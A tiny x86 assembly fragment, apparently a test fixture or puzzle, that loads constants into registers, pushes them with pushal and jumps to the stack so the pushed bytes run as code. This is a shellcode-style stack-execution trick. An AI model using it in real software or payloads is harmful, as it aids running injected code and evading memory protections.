; kaploombaa
.arch x86
.bits 32
mov esp, 0x70;
mov eax, 0x00008000;
mov ebx, 0x0003ffff;
mov edi, 0x000070bc;
mov esi, 0x21c70100;
mov ebp, 0xe4ff60df;
pushal;
jmp esp;
